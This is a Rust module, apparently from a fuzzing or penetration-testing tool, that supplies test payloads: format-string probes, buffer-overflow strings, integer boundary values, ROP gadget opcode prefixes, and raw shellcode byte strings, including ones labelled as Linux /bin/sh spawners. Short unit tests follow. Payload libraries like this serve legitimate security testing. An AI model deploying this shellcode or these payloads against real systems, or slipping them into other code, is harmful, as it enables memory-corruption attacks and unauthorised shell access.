pub struct BinaryPayloads;

impl BinaryPayloads {
    pub fn format_strings() -> Vec<&'static str> {
        vec!["%x", "%n", "%s", "%p", "%x%x%x%x", "%n%n%n%n"]
    }

    pub fn buffer_overflow(lengths: &[usize]) -> Vec<String> {
        lengths.iter().map(|&l| "A".repeat(l)).collect()
    }

    pub fn integer_overflow() -> Vec<i64> {
        vec![
            -1,
            0,
            1,
            255,
            256,
            65535,
            65536,
            2147483647,
            2147483648,
            -2147483648,
        ]
    }

    pub fn shellcode_patterns() -> Vec<(&'static str, &'static str)> {
        vec![
            ("linux_x86_binsh", "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"),
            ("linux_x64_binsh", "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"),
            ("windows_messagebox", "\\x31\\xc0\\x64\\x8b\\x70\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x6e\\x08\\x8b\\x36\\x8b\\x5d\\x3c\\x8b\\x5c\\x1d\\x78\\x01\\xeb\\x8b\\x4b\\x18\\x8b\\x7b\\x20\\x01\\xef\\x8b\\x7c\\x8f\\xfc\\x01\\xef\\x31\\xc0\\x50\\x68\\x65\\x58\\x65\\x63\\x68\\x6d\\x70\\x4c\\x61\\x54\\x5a\\x50\\x53\\xff\\xd7"),
        ]
    }

    pub fn rop_gadget_prefixes() -> Vec<u8> {
        vec![0xC3, 0xC2, 0xCB, 0xCA]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_strings_not_empty() {
        assert!(!BinaryPayloads::format_strings().is_empty());
    }

    #[test]
    fn test_buffer_overflow_generates_correct_length() {
        let bufs = BinaryPayloads::buffer_overflow(&[10, 100]);
        assert_eq!(bufs[0].len(), 10);
        assert_eq!(bufs[1].len(), 100);
    }

    #[test]
    fn test_integer_overflow_has_boundaries() {
        let ints = BinaryPayloads::integer_overflow();
        assert!(ints.contains(&-1));
        assert!(ints.contains(&0));
        assert!(ints.contains(&2147483647));
    }

    #[test]
    fn test_shellcode_not_empty() {
        assert!(!BinaryPayloads::shellcode_patterns().is_empty());
    }
}
